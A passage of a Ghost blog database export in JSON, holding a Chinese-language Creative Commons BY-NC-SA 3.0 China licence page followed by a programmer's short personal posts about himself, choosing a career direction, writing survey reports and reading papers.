Identifier）。您不得就本作品提出或增加任何条款，从而限制本许可协议或者限制获得本作品的第三方行使本许可协议所赋予的权利。您不得对本作品进行再许可。您必须在您发行或公开传播的每份作品复制件中完整保留所有与本许可协议及免责条款相关的声明。\n在发行或公开传播本作品时，您不得对本作品施加任何技术措施，从而限制从您处获得本作品的第三方行使本许可协议授予的权利。本项（第四条第1项）规定同样适用于收录在汇编作品中的本作品，但并不要求汇编作品中除本作品外的其他作品受本许可协议的约束。在创作汇编作品时，若接到任一许可人的通知，您必须按照其要求，在可行范围内删除汇编作品中根据本协议第四条第4项的要求所作的有关原始作者的身份及其他有关原始作品相关信息的标注。在创作演绎作品时，若接到任一许可人的通知，您必须根据其要求，在可行范围内删除演绎作品中根据第四条第4项的要求所作的有关原始作者的身份及其他有关原始作品的相关信息的标注。<br/>\n</li>\n<li>\n您必须以下述许可条款发行或公开传播演绎作品：（1）本许可协议；（2）与本许可协议具有相同授权要素的后续版本；或者（3）与本许可协议具有相同授权要素的其他司法管辖区的知识共享许可协议或其后续版本（例如：署名-非商业性使用-相同方式共享 3.0 美国）（以上三类协议统称为“可适用的协议”）。在您发行或公开传播的每件演绎作品的复制件中，您必须附上一份“可适用的协议”的复制件或网址。您不得就演绎作品提出或增加任何条款，从而限制“可适用的协议”的规定，或者限制获得演绎作品的第三方行使“可适用的协议”所赋予的权利。在发行或公开传播包含本作品的演绎作品时，您必须在本作品的每一份复制件中完整地保留所有与“可适用的协议”及免责条款相关的声明。在发行或公开传播演绎作品时，您不得对演绎作品施加任何技术措施，从而限制从您处获得演绎作品的第三方行使“可适用的协议”所赋予的权利。本项（第四条第2项）规定同样适用于收录在汇编作品中的演绎作品，但并不要求汇编作品中除基于本作品而创作的演绎作品之外的其他作品受“可适用的协议”的约束。\n</li>\n<li>\n您不得以任何形式行使本协议第三条授予您的权利去谋取或获得商业利益或私人金钱报酬。若交换过程中未涉及任何商业利益或私人金钱报酬，通过数字文件共享方式或其他方式用本作品去交换其他受著作权保护的作品，将不被视为谋取或获得商业利益或私人金钱报酬。</li>\n<li>在发行或公开传播本作品、任何演绎作品或汇编作品时，除非有依据第四条第1项之要求，否则您必须完整保留所有关于本作品的著作权声明，并以适于所使用的媒介或方法的形式提供下述信息：（1）在原始作者的姓名（或笔名）已被提供的情况下，给出该姓名或笔名，或者在原始作者或许可人以许可人的著作权声明或其他合理的方式，指定可以在作品上署名的他方当事人姓名的情况下，指明该他方当事人的名称（“署名人”）；（2）在本作品标题已被提供的情况下，给出本作品的标题；（3）在合理可行的范围内，标明许可人指定需与本作品同时出现的网址，除非该网址没有涉及到本作品的著作权声明或者关于本作品的许可信息；（4）若为演绎作品，则依第三条第2项之要求，必须注明演绎作品中使用的本作品的作者姓名和作品名称（例如，“某作者作品的法语译本”，或“基于某作者作品的电影剧本”）。本项（第四条第4项）要求的对作者姓名和作品名称的指明可采取任何合理方式，但在演绎作品或汇编作品中，如果已经指明了演绎作品的所有作者或汇编作品中所有内含作品的作者，那么对本作品名称和作者姓名的指明须同时出现在任何其他作者姓名出现的地方，并至少与对其他作者的指明一样显著。为避免疑义，本条有关标示作者姓名和作品名称之规定，仅适用于前述署名的用途；除非您事先另行取得原始作者、许可人或署名人的书面同意，否则您不得以明示或者默示的方式主张或暗示，您本人或您对作品的使用与原始作者、许可人或署名人有关联或者已获得上述人士的赞助或者支持。</li>\n<li><p>为避免疑义，针对不同司法管辖区的著作权许可体系作出如下约定：</p>\n<ol type=\"i\">\n<li><strong>权利不能放弃的强制许可体系</strong>。<br/><br/>\n在那些许可人不能放弃通过任何法定的或强制的许可方案收取许可使用费的权利的司法管辖区，许可人保留因您行使本许可协议授予的权利而向您收取许可使用费的专有权；</li>\n<li><strong>权利可以放弃的强制许可体系</strong>。<br/><br/>\n在那些许可人可以放弃通过任何法定的或强制的许可方案收取许可使用费的权利的司法管辖区，许可人放弃因您行使本许可协议授予的权利而向您收取许可使用费的专有权；但若您行使本许可协议授予的权利时未遵守本许可协议第四条第3项有关非商业性使用的规定，则许可人保留向您收取本作品许可使用费的权利；</li>\n<li><strong>自愿许可体系</strong>。<br/><br/>\n在实行著作权自愿许可的司法管辖区，若您行使本许可协议授予的权利时未遵守本许可协议第四条第3项有关非商业性使用的规定，则许可人保留向您收取本作品许可使用费的权利，许可人可以自行或者通过所参加的著作权集体管理组织向您收取本作品的许可使用费。</li>\n</ol>\n</li>\n<li>\n除非其他法律法规另有规定，您在复制、发行或者公开表演本作品，或者复制、发行或者公开表演作为任何演绎作品或汇编作品一部分的本作品时，不得歪曲、损害或者以其他方式损害本作品，导致原始作者的名誉或者荣誉受损。</li>\n</ol>\n<p><strong>第五条 声明、保证和免责</strong></p>\n<p>\n除非本许可的当事人相互以书面的方式做出相反约定，且在相关法律所允许的最大范围内，否则许可人按其现状提供本作品，对本作品不作任何明示或者默示、依照法律或者其他规定的陈述或担保，包括但是不限于任何有关可否商业性使用、是否符合特定的目的、不具有潜在的或者其他缺陷、准确性或者不存在不论能否被发现的错误的担保。有些司法管辖区不允许排除前述默示保证，因此这些排除性规定并不一定适用于您。</p>\n<p><strong>第六条 责任限制</strong></p>\n<p>\n除非属于相关法律所要求的范围，许可人在任何情况下都不对您因本许可或因使用本作品而产生的任何直接损失、间接损失或惩罚性赔偿负责，即使许可人已被告知发生此类损害的可能性。 </p>\n<p><strong>第七条 许可终止</strong> </p>\n<ol type=\"1\">\n<li>\n在您违反本许可协议任何条款时，本许可及其所授予的权利将自动终止。然而，根据本许可从您处获取演绎作品或汇编作品的自然人、法人或者其他组织，如果他们仍完全遵守相关条款，则对他们的许可不会随之终止。即使本许可被终止，第一条、第二条、第五条、第六条、第七条以及第八条仍然有效。</li>\n<li>\n在上述条款及条件的前提下，此处授予的许可在法定著作权保护期限内有效。即便如此，许可人保留依其他许可条款发行本作品及在任何时候停止发行本作品的权利；但是，许可人的上述权利不能被用于撤销本许可或任何其他在本许可条款下授予的或必须授予的许可，除本条第1项指明的终止外，本许可将保持其完全效力。</li>\n</ol>\n<p><strong>第八条 其他事项</strong> </p>\n<ol type=\"1\">\n<li>\n当您发行、公开传播本作品或其汇编作品时，许可人给获得作品的第三方提供本作品的许可，其条款和条件与您所获得的许可相同。</li>\n<li>\n当您发行或公开传播演绎作品时，许可人给获得作品的第三方提供本作品的许可，其条款和条件与您所获得的许可相同。</li>\n<li>\n如因相关法律，本许可的某一条款无效或不能履行，本许可其余条款的有效性和可履行性不受影响。如本许可的当事人未采取进一步措施，此类无效条款应在必要范围内进行最低限度的修改以使其有效和可履行。</li>\n<li>\n除非当事人书面同意并签字放弃某条款和允许某违约行为，本许可的任何条款或规定都不应被视为已被放弃，或被视为允许此违约行为。</li>\n<li>\n本许可构成相关当事人与本授权作品相关的全部协议。除已在此处确认的之外，并不存在任何与本作品相关的谅解备忘录、协议或声明。许可人不受您提出的任何附加规定的约束。未经许可人和您双方书面同意，本许可不得更改。</li>\n</ol>\n<blockquote>\n<h3>“知识共享”（Creative Commons）声明</h3>\n<p>\n“知识共享”不是本许可协议的一方，对本作品不作任何相关保证。“知识共享”不对您或任何其他方的任何损失负责，包括但不限于与本许可相关的直接损失和间接损失。虽然有上述两点，但如果“知识共享”已明确标识自己为许可人，它将承担许可人的全部权利和义务。 </p>\n<p>\n除用于向公众表明本作品是依照知识共享公共许可协议（CCPL）授权以外，如未经“知识共享”事先书面同意，任何一方均不得使用“知识共享”（Creative Commons）商标和其他相关商标及标识。任何被允许的使用都必须符合“知识共享”的现行商标使用准则。该准则已在其网站上发布或可应要求随时提供。为避免疑义，本段关于商标的限制性规定不构成本许可之一部分。</p>\n<p>您可以通过<a href=\"https://creativecommons.org/\">https://creativecommons.org/</a>联系“知识共享”。</p>\n</blockquote>\n</div>\n</div>\n</div>\n</body>\n</html>\n</div>","amp":"2","plaintext":"知识共享许可协议法律文本\n署名-非商业性使用-相同方式共享 3.0中国大陆\n“知识共享”（Creative\nCommons）不是一家律师事务所也不对外提供法律服务。提供本许可协议文本并不导致“律师—当事人”关系的建立。“知识共享”按其现状（As\nIs）提供这些信息。“知识共享”对于所提供的信息不提供任何担保，也不对因使用该信息而造成的损失承担损害赔偿责任。协议文本\n本作品（定义如下）的提供是以适用“知识共享公共许可协议”（ 简称“CCPL”或\n“许可”）为前提的。本作品受《中华人民共和国著作权法》以及其他可适用法律的保护。对本作品的使用不得超越本许可协议授权的范围。\n\n如您行使本许可授予的使用本作品的权利，就表明您接受并同意遵守本许可协议的所有条款。鉴于本许可为合同，在您接受这些条款和规定的前提下，许可人授予您本许可所包括的权利。\n \n\n第一条 定义  \n\n 1.  本作品：\n     指根据本许可协议提供的以任何方式和形式（包括以数字形式）表达之文学、艺术和科学领域的作品，例如：书籍、手册等文字作品；讲课、演讲、讲道及其他同类性质的作品；戏剧或音乐戏剧作品；曲艺作品；舞蹈作品及哑剧作品；配词或不配词的音乐作品；电影作品和以类似摄制电影的方法创作的作品；素描、绘画、书法、建筑、雕塑、雕刻或版画等作品；摄影作品以及以类似摄影的方法创作的作品；杂技艺术作品；实用艺术作品；与地理、地形、建筑或科学有关的插图、地图、设计图、草图及立体的造型作品；以及法律、行政法规规定的其他文学艺术作品。为本许可协议之目的，本协议有关“本作品”的规定适用于表演、录音制品及广播电视节目。\n 2.  原始作者：\n     就文学或艺术作品而言，指创作本作品的自然人或依法视为本作品作者的法人或其他组织。为本许可之目的，下述情形下的自然人、法人或其他组织适用本许可有关“原始作者”的规定：（1）就表演而言，指演员、歌唱家、音乐家、舞蹈家和其他表演、演唱、演说、朗诵、演奏、表现或者以其它方式表演文学、艺术作品或民间文学艺术的人员；（2）就录音制品而言，指首次将表演的声音或其他声音录制下来的自然人、法人或其他组织；（3）就广播电视节目而言，指传播广播电视节目的组织；（4）作者身份不明的，指行使作品著作权（除署名权外）的作品原件所有人（比如出版社）。\n 3.  演绎作品：\n     指基于本作品，或基于本作品与其他已存在的作品而创作的作品，例如翻译、改编、编曲或对文学、艺术和科学作品的其他变更，包括以摄制电影的方法对作品的改编，或其他任何对本作品进行改造、转换、或改编后的形式，包含任何可确认为源自原始作品的修改形式。在本许可定义之下构成汇编作品的作品不视为演绎作品。为避免疑义，并为本许可之目的，当演绎对象为音乐作品时，将其依时间序列关系与动态影像配合一致而形成的结果，视为演绎作品。\n 4.  汇编作品：\n     指由于对内容的选择和编排具有独创性而构成智力创作的文学、艺术或科学作品的集合，其中本作品以完整且未经修改的形式和另外一部或多部作品组成集合的整体，而各组成作品本身是分开且独立的，例如百科全书、文选、数据汇编作品，以及本条第1项所列作品之外的作品或者标的。在本许可定义之下构成汇编作品的作品不视为演绎作品（定义如上）。\n 5.  许可人：指根据本许可提供本作品的自然人、法人或者其他组织。\n 6.  您：指以前就本作品没有违反过本许可协议、或曾违反过协议但已获得许可人明示同意、依据本许可行使权利的自然人、法人或者其他组织。\n 7.  授权要素：是指许可人所选择的、并标示在本许可文本标题中的下列基本属性：署名、非商业性使用、相同方式共享。\n 8.  发行：指以出售或者其他权利移转方式向公众提供本作品或者演绎作品的原件或者复制件。\n 9.  公开传播：\n     指公开朗诵本作品以及以任何方式或程序，包括以有线、无线的方式或通过信息网络公开传播本作品的公开朗诵；或向公众提供本作品，使公众可以在自己选定的地点获得本作品；或以任何方式或程序公开表演本作品或向公众传播本作品的表演，包括通过信息网络传播本作品的表演；或以任何方式，包括符号、声音或图像，广播或转播本作品。上述定义包括相关法律规定的“展览”、“表演”、“放映”、“广播”或通过信息网络向公众传播作品等传播方式。\n 10. 复制：指以印刷、复印、拓印、录音、录像、翻录、翻拍等方式制作本作品的复制件。\n 11. 人身权：指相关法律赋予作者对本作品所享有的发表权、署名权、修改权以及保护作品完整权。\n\n第二条 合理使用  \n\n本许可无意削减、限制或约束您基于《中华人民共和国著作权法》或其他相关法律有关著作权保护的限制或例外的规定对本作品的合理使用。\n\n第三条 授权\n\n根据本许可的条款和条件，许可人在此授予您全球性、免版税、非独占并且在本作品的著作权存续期间内均有效的许可，就本作品行使以下权利：\n\n 1. \n    复制本作品或将本作品收入一个或多个汇编作品中，以及复制汇编作品中收录的本作品；\n 2. \n    创作和复制演绎作品，但是任何演绎作品，包括任何形式的翻译作品，均需以合理方式清楚地标示、区分或以其他方法表明原始作品已经被修改或变更。例如，翻译作品可以标明“原作品已由英文翻译为西班牙文”，改编作品可以标明“原作品已作修改”；\n 3. \n    发行、公开传播本作品（包括汇编作品中收录的本作品）；\n 4. \n    发行、公开传播演绎作品。\n\n\n以上权利可在任何现有的或者以后出现的并为可适用的法律认可的媒体和形式上行使。上述权利包括为在其他媒体和形式上行使权利而必须进行技术性修改的权利。许可人在此保留所有未明示授予的权利，包括但不限于第四条第5项所规定的权利。\n\n第四条 限制\n\n第三条的授权须受以下规定的限制： \n\n 1. \n    您在发行或公开传播本作品时，必须遵守本许可协议。在您发行或公开传播的本作品的每一份复制件中，您必须附上一份本许可协议的复制件或本许可协议的网址（Uniform\n    Resource\n    Identifier）。您不得就本作品提出或增加任何条款，从而限制本许可协议或者限制获得本作品的第三方行使本许可协议所赋予的权利。您不得对本作品进行再许可。您必须在您发行或公开传播的每份作品复制件中完整保留所有与本许可协议及免责条款相关的声明。\n    在发行或公开传播本作品时，您不得对本作品施加任何技术措施，从而限制从您处获得本作品的第三方行使本许可协议授予的权利。本项（第四条第1项）规定同样适用于收录在汇编作品中的本作品，但并不要求汇编作品中除本作品外的其他作品受本许可协议的约束。在创作汇编作品时，若接到任一许可人的通知，您必须按照其要求，在可行范围内删除汇编作品中根据本协议第四条第4项的要求所作的有关原始作者的身份及其他有关原始作品相关信息的标注。在创作演绎作品时，若接到任一许可人的通知，您必须根据其要求，在可行范围内删除演绎作品中根据第四条第4项的要求所作的有关原始作者的身份及其他有关原始作品的相关信息的标注。\n    \n 2. \n    您必须以下述许可条款发行或公开传播演绎作品：（1）本许可协议；（2）与本许可协议具有相同授权要素的后续版本；或者（3）与本许可协议具有相同授权要素的其他司法管辖区的知识共享许可协议或其后续版本（例如：署名-非商业性使用-相同方式共享\n    3.0\n    美国）（以上三类协议统称为“可适用的协议”）。在您发行或公开传播的每件演绎作品的复制件中，您必须附上一份“可适用的协议”的复制件或网址。您不得就演绎作品提出或增加任何条款，从而限制“可适用的协议”的规定，或者限制获得演绎作品的第三方行使“可适用的协议”所赋予的权利。在发行或公开传播包含本作品的演绎作品时，您必须在本作品的每一份复制件中完整地保留所有与“可适用的协议”及免责条款相关的声明。在发行或公开传播演绎作品时，您不得对演绎作品施加任何技术措施，从而限制从您处获得演绎作品的第三方行使“可适用的协议”所赋予的权利。本项（第四条第2项）规定同样适用于收录在汇编作品中的演绎作品，但并不要求汇编作品中除基于本作品而创作的演绎作品之外的其他作品受“可适用的协议”的约束。\n 3. \n    您不得以任何形式行使本协议第三条授予您的权利去谋取或获得商业利益或私人金钱报酬。若交换过程中未涉及任何商业利益或私人金钱报酬，通过数字文件共享方式或其他方式用本作品去交换其他受著作权保护的作品，将不被视为谋取或获得商业利益或私人金钱报酬。\n 4. 在发行或公开传播本作品、任何演绎作品或汇编作品时，除非有依据第四条第1项之要求，否则您必须完整保留所有关于本作品的著作权声明，并以适于所使用的媒介或方法的形式提供下述信息：（1）在原始作者的姓名（或笔名）已被提供的情况下，给出该姓名或笔名，或者在原始作者或许可人以许可人的著作权声明或其他合理的方式，指定可以在作品上署名的他方当事人姓名的情况下，指明该他方当事人的名称（“署名人”）；（2）在本作品标题已被提供的情况下，给出本作品的标题；（3）在合理可行的范围内，标明许可人指定需与本作品同时出现的网址，除非该网址没有涉及到本作品的著作权声明或者关于本作品的许可信息；（4）若为演绎作品，则依第三条第2项之要求，必须注明演绎作品中使用的本作品的作者姓名和作品名称（例如，“某作者作品的法语译本”，或“基于某作者作品的电影剧本”）。本项（第四条第4项）要求的对作者姓名和作品名称的指明可采取任何合理方式，但在演绎作品或汇编作品中，如果已经指明了演绎作品的所有作者或汇编作品中所有内含作品的作者，那么对本作品名称和作者姓名的指明须同时出现在任何其他作者姓名出现的地方，并至少与对其他作者的指明一样显著。为避免疑义，本条有关标示作者姓名和作品名称之规定，仅适用于前述署名的用途；除非您事先另行取得原始作者、许可人或署名人的书面同意，否则您不得以明示或者默示的方式主张或暗示，您本人或您对作品的使用与原始作者、许可人或署名人有关联或者已获得上述人士的赞助或者支持。\n 5. 为避免疑义，针对不同司法管辖区的著作权许可体系作出如下约定：\n    \n     1. 权利不能放弃的强制许可体系。\n        \n        在那些许可人不能放弃通过任何法定的或强制的许可方案收取许可使用费的权利的司法管辖区，许可人保留因您行使本许可协议授予的权利而向您收取许可使用费的专有权；\n     2. 权利可以放弃的强制许可体系。\n        \n        在那些许可人可以放弃通过任何法定的或强制的许可方案收取许可使用费的权利的司法管辖区，许可人放弃因您行使本许可协议授予的权利而向您收取许可使用费的专有权；但若您行使本许可协议授予的权利时未遵守本许可协议第四条第3项有关非商业性使用的规定，则许可人保留向您收取本作品许可使用费的权利；\n     3. 自愿许可体系。\n        \n        在实行著作权自愿许可的司法管辖区，若您行使本许可协议授予的权利时未遵守本许可协议第四条第3项有关非商业性使用的规定，则许可人保留向您收取本作品许可使用费的权利，许可人可以自行或者通过所参加的著作权集体管理组织向您收取本作品的许可使用费。\n    \n    \n 6. \n    除非其他法律法规另有规定，您在复制、发行或者公开表演本作品，或者复制、发行或者公开表演作为任何演绎作品或汇编作品一部分的本作品时，不得歪曲、损害或者以其他方式损害本作品，导致原始作者的名誉或者荣誉受损。\n\n第五条 声明、保证和免责\n\n\n除非本许可的当事人相互以书面的方式做出相反约定，且在相关法律所允许的最大范围内，否则许可人按其现状提供本作品，对本作品不作任何明示或者默示、依照法律或者其他规定的陈述或担保，包括但是不限于任何有关可否商业性使用、是否符合特定的目的、不具有潜在的或者其他缺陷、准确性或者不存在不论能否被发现的错误的担保。有些司法管辖区不允许排除前述默示保证，因此这些排除性规定并不一定适用于您。\n\n第六条 责任限制\n\n\n除非属于相关法律所要求的范围，许可人在任何情况下都不对您因本许可或因使用本作品而产生的任何直接损失、间接损失或惩罚性赔偿负责，即使许可人已被告知发生此类损害的可能性。\n \n\n第七条 许可终止  \n\n 1. \n    在您违反本许可协议任何条款时，本许可及其所授予的权利将自动终止。然而，根据本许可从您处获取演绎作品或汇编作品的自然人、法人或者其他组织，如果他们仍完全遵守相关条款，则对他们的许可不会随之终止。即使本许可被终止，第一条、第二条、第五条、第六条、第七条以及第八条仍然有效。\n 2. \n    在上述条款及条件的前提下，此处授予的许可在法定著作权保护期限内有效。即便如此，许可人保留依其他许可条款发行本作品及在任何时候停止发行本作品的权利；但是，许可人的上述权利不能被用于撤销本许可或任何其他在本许可条款下授予的或必须授予的许可，除本条第1项指明的终止外，本许可将保持其完全效力。\n\n第八条 其他事项  \n\n 1. \n    当您发行、公开传播本作品或其汇编作品时，许可人给获得作品的第三方提供本作品的许可，其条款和条件与您所获得的许可相同。\n 2. \n    当您发行或公开传播演绎作品时，许可人给获得作品的第三方提供本作品的许可，其条款和条件与您所获得的许可相同。\n 3. \n    如因相关法律，本许可的某一条款无效或不能履行，本许可其余条款的有效性和可履行性不受影响。如本许可的当事人未采取进一步措施，此类无效条款应在必要范围内进行最低限度的修改以使其有效和可履行。\n 4. \n    除非当事人书面同意并签字放弃某条款和允许某违约行为，本许可的任何条款或规定都不应被视为已被放弃，或被视为允许此违约行为。\n 5. \n    本许可构成相关当事人与本授权作品相关的全部协议。除已在此处确认的之外，并不存在任何与本作品相关的谅解备忘录、协议或声明。许可人不受您提出的任何附加规定的约束。未经许可人和您双方书面同意，本许可不得更改。\n\n“知识共享”（Creative Commons）声明\n\n“知识共享”不是本许可协议的一方，对本作品不作任何相关保证。“知识共享”不对您或任何其他方的任何损失负责，包括但不限于与本许可相关的直接损失和间接损失。虽然有上述两点，但如果“知识共享”已明确标识自己为许可人，它将承担许可人的全部权利和义务。\n \n\n\n除用于向公众表明本作品是依照知识共享公共许可协议（CCPL）授权以外，如未经“知识共享”事先书面同意，任何一方均不得使用“知识共享”（Creative\nCommons）商标和其他相关商标及标识。任何被允许的使用都必须符合“知识共享”的现行商标使用准则。该准则已在其网站上发布或可应要求随时提供。为避免疑义，本段关于商标的限制性规定不构成本许可之一部分。\n\n您可以通过https://creativecommons.org/联系“知识共享”。","feature_image":null,"featured":0,"page":1,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-04T08:58:42.000Z","created_by":"1","updated_at":"2015-07-04T09:03:11.000Z","updated_by":"1","published_at":"2015-07-04T09:03:11.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c38","uuid":"ff178416-1067-4db5-a83f-1d43b1d795ee","title":"作者小像","slug":"myself","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##我是谁\\n一名客居日本的普通程序员，梦想是开个农场当农场主，无忧无虑地过田园生活。\\n\\n当了近10年C/C++选手，却依然停留在初级水准；学了安全方向，却对黑客相关技术一窍不通；目前用 Python 工作，基本上是废猿一只，从头开始。多年来忙忙碌碌，似乎是一事无成。\\n\\n人生那么短暂，没有多余的时间浪费在代码上，只想慢慢地走，多看看两侧的风景。\\n\\n##对我感兴趣\\n* 请在文后留言或发邮件\\n* 性别：男\\n* 坐标：日本尼崎\\n\\n##谁教过我\\n* 南开大学 计算机技术（信息安全方向） 工程硕士\\n* 首都师范大学 计算机科学与技术（师范） 理学学士。\\n\\n##谁正雇佣我\\n* 株式会社 MonotaRO\\n\\n##谁曾雇佣我\\n* 深圳某只大企鹅 - 正式员工\\n* Singapore Management University - Research Assistant\\n* 天津某只大企鹅 - 实习生\\n\\n##我喜欢啥\\n* 各种宅\\n* 各种胡思乱想\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><h2 id=\"\">我是谁</h2>\n<p>一名客居日本的普通程序员，梦想是开个农场当农场主，无忧无虑地过田园生活。</p>\n<p>当了近10年C/C++选手，却依然停留在初级水准；学了安全方向，却对黑客相关技术一窍不通；目前用 Python 工作，基本上是废猿一只，从头开始。多年来忙忙碌碌，似乎是一事无成。</p>\n<p>人生那么短暂，没有多余的时间浪费在代码上，只想慢慢地走，多看看两侧的风景。</p>\n<h2 id=\"\">对我感兴趣</h2>\n<ul>\n<li>请在文后留言或发邮件</li>\n<li>性别：男</li>\n<li>坐标：日本尼崎</li>\n</ul>\n<h2 id=\"\">谁教过我</h2>\n<ul>\n<li>南开大学 计算机技术（信息安全方向） 工程硕士</li>\n<li>首都师范大学 计算机科学与技术（师范） 理学学士。</li>\n</ul>\n<h2 id=\"\">谁正雇佣我</h2>\n<ul>\n<li>株式会社 MonotaRO</li>\n</ul>\n<h2 id=\"\">谁曾雇佣我</h2>\n<ul>\n<li>深圳某只大企鹅 - 正式员工</li>\n<li>Singapore Management University - Research Assistant</li>\n<li>天津某只大企鹅 - 实习生</li>\n</ul>\n<h2 id=\"\">我喜欢啥</h2>\n<ul>\n<li>各种宅</li>\n<li>各种胡思乱想</li>\n</ul>\n</div>","amp":"3","plaintext":"我是谁\n一名客居日本的普通程序员，梦想是开个农场当农场主，无忧无虑地过田园生活。\n\n当了近10年C/C++选手，却依然停留在初级水准；学了安全方向，却对黑客相关技术一窍不通；目前用 Python\n工作，基本上是废猿一只，从头开始。多年来忙忙碌碌，似乎是一事无成。\n\n人生那么短暂，没有多余的时间浪费在代码上，只想慢慢地走，多看看两侧的风景。\n\n对我感兴趣\n * 请在文后留言或发邮件\n * 性别：男\n * 坐标：日本尼崎\n\n谁教过我\n * 南开大学 计算机技术（信息安全方向） 工程硕士\n * 首都师范大学 计算机科学与技术（师范） 理学学士。\n\n谁正雇佣我\n * 株式会社 MonotaRO\n\n谁曾雇佣我\n * 深圳某只大企鹅 - 正式员工\n * Singapore Management University - Research Assistant\n * 天津某只大企鹅 - 实习生\n\n我喜欢啥\n * 各种宅\n * 各种胡思乱想","feature_image":null,"featured":0,"page":1,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-04T10:52:10.000Z","created_by":"1","updated_at":"2017-01-27T23:17:12.000Z","updated_by":"1","published_at":"2015-07-04T10:54:58.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c39","uuid":"c9513dcf-ff70-4b3c-9fd2-3bd0f4d2f14c","title":"如何选择方向","slug":"xuan-ze-fang-xiang","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n方向已定，多说无益。\\n\\n1. 如果成功了，那这个方向就是方向。\\n2. 如果失败了，那又是新的规划。\\n3. 当时选择的原则是，尽量让自己的过去为自己的未来产生加分的作用。\\n\\n---\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>方向已定，多说无益。</p>\n<ol>\n<li>如果成功了，那这个方向就是方向。</li>\n<li>如果失败了，那又是新的规划。</li>\n<li>当时选择的原则是，尽量让自己的过去为自己的未来产生加分的作用。</li>\n</ol>\n<hr>\n</div>","amp":"4","plaintext":"方向已定，多说无益。\n\n 1. 如果成功了，那这个方向就是方向。\n 2. 如果失败了，那又是新的规划。\n 3. 当时选择的原则是，尽量让自己的过去为自己的未来产生加分的作用。\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-04T12:10:55.000Z","created_by":"1","updated_at":"2015-07-07T03:01:38.000Z","updated_by":"1","published_at":"2015-07-04T12:11:06.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c3a","uuid":"726a1f93-dd76-4fea-a554-546cfa246dca","title":"如何把握调研报告","slug":"diao-yan-bao-gao","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"因为是历史文章搬运，所以去掉已经无用的东西，简要概括。\\n\\n##情况\\n* 有三个月时间。\\n* 有机会和老师交流，中途调整。\\n* 交的是**调查**，即求全不求深。\\n##入手\\n###如何写中文报告\\n当然是用手写。\\n###如何写英文报告\\n以英文写英文，参考英文论文原句进行转义。\\n###切入方向\\n* 中文博士论文\\n* 英文论文\\n* 老师历史\\n##相关书籍\\n[0day安全：软件漏洞分析技术](http://e.jd.com/30149952.html)\\n##穿墙方式\\n* Goagent，我一般不用。\\n* 花钱，我一般用[CroLAX](https://gocrolax.com/One/index)，现在ShadowSocks比Socks更稳定一些。 \\n\\n---\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>因为是历史文章搬运，所以去掉已经无用的东西，简要概括。</p>\n<h2 id=\"\">情况</h2>\n<ul>\n<li>有三个月时间。</li>\n<li>有机会和老师交流，中途调整。</li>\n<li>交的是<strong>调查</strong>，即求全不求深。</li>\n</ul>\n<h2 id=\"\">入手</h2>\n<h3 id=\"\">如何写中文报告</h3>\n<p>当然是用手写。</p>\n<h3 id=\"\">如何写英文报告</h3>\n<p>以英文写英文，参考英文论文原句进行转义。</p>\n<h3 id=\"\">切入方向</h3>\n<ul>\n<li>中文博士论文</li>\n<li>英文论文</li>\n<li>老师历史</li>\n</ul>\n<h2 id=\"\">相关书籍</h2>\n<p><a href=\"http://e.jd.com/30149952.html\">0day安全：软件漏洞分析技术</a></p>\n<h2 id=\"\">穿墙方式</h2>\n<ul>\n<li>Goagent，我一般不用。</li>\n<li>花钱，我一般用<a href=\"https://gocrolax.com/One/index\">CroLAX</a>，现在ShadowSocks比Socks更稳定一些。</li>\n</ul>\n<hr>\n</div>","amp":"5","plaintext":"因为是历史文章搬运，所以去掉已经无用的东西，简要概括。\n\n情况\n * 有三个月时间。\n * 有机会和老师交流，中途调整。\n * 交的是调查，即求全不求深。\n\n入手\n如何写中文报告\n当然是用手写。\n\n如何写英文报告\n以英文写英文，参考英文论文原句进行转义。\n\n切入方向\n * 中文博士论文\n * 英文论文\n * 老师历史\n\n相关书籍\n0day安全：软件漏洞分析技术 [http://e.jd.com/30149952.html]\n\n穿墙方式\n * Goagent，我一般不用。\n * 花钱，我一般用CroLAX [https://gocrolax.com/One/index]，现在ShadowSocks比Socks更稳定一些。\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-05T05:58:40.000Z","created_by":"1","updated_at":"2015-07-07T03:01:28.000Z","updated_by":"1","published_at":"2015-07-05T06:20:01.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c3b","uuid":"3bd2d1b3-1949-4b22-be5d-86944420b659","title":"如何读论文","slug":"du-lun-wen","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"今天上午有点时间，就模拟了一把读论文，首先是打开[Google 